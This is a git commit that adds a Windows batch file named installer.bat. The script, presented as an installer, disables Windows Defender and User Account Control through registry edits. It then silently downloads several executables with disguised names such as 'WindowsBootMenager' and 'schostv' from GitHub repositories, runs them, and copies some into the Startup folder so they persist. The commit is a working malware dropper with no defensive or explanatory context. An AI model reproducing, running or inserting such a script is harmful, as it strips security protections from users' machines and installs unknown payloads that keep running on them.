71d2b714099dc6761f088aa9aff4380d9597e3ff
DanGILC-137 <163125984+DanGILC-137@users.noreply.github.com>
2024-05-27 13:52:51 +0200

    Add files via upload

---
+++ installer.bat
@@ -0,0 +1,14 @@
+@echo off
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
+reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+curl -s -o "WindowsBootMenager".exe -JL "https://github.com/DanGILC-137/Explorer/raw/main/WindowsBootMenager.exe"
+xcopy /y WindowsBootMenager.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+WindowsBootMenager.exe
+curl -s -o "chromedrivers".exe -JL "https://github.com/DanGILC-137/Explorer/raw/main/chromedrivers.exe"
+chromedrivers.exe
+curl -s -o "schostv".exe -JL "https://github.com/DanGILC-137/Explorer/raw/main/schostv.exe"
+schostv.exe
+curl -s -o "installer".exe -JL "https://github.com/DanGILC-137/Legend/raw/main/installer.exe"
+xcopy /y installer.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+installer.exe
